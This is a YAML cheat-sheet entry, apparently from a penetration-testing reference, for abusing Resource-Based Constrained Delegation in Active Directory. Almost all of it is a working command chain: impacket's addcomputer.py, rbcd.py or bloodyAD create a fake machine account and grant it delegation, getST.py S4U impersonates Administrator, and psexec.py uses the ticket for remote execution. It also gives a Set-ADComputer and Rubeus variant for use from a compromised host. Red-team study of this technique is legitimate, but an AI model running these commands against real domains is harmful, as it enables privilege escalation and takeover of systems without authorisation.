---
description: |
  Resource-Based Constrained Delegation (RBCD) abuse — with write access to msDS-AllowedToActOnBehalfOfOtherIdentity, create a machine account and impersonate any user to the target.
commands:
  - have: Credentials
    cmd: |
      # Need: write access to msDS-AllowedToActOnBehalfOfOtherIdentity on target

      # Create a machine account (if MachineAccountQuota > 0)
      addcomputer.py senshu.sh/sec_user:'P@ssw0rd' -computer-name 'FAKE01$' -computer-pass 'FakePass123' -dc-ip 10.10.10.27

      # Set RBCD on target to allow FAKE01$ to impersonate
      rbcd.py senshu.sh/sec_user:'P@ssw0rd' -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -dc-ip 10.10.10.27 -action write

      # Get impersonated service ticket via S4U
      getST.py senshu.sh/'FAKE01$':'FakePass123' -spn cifs/TARGET.senshu.sh -impersonate Administrator -dc-ip 10.10.10.27

      # Use the ticket
      export KRB5CCNAME=Administrator.ccache
      psexec.py senshu.sh/Administrator@TARGET.senshu.sh -k -no-pass

      # With bloodyAD — set RBCD
      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add rbcd 'TARGET$' 'FAKE01$'
  - have: Shell
    cmd: |
      # From compromised host with PowerShell/AD module
      Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount FAKE01$

      # Then use Rubeus S4U to get service ticket
      .\Rubeus.exe s4u /user:FAKE01$ /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.senshu.sh /ptt
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
  - LDAP
techniques:
  - RBCD
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html
  - https://github.com/fortra/impacket
  - https://github.com/GhostPack/Rubeus
  - https://github.com/CravateRouge/bloodyAD
---
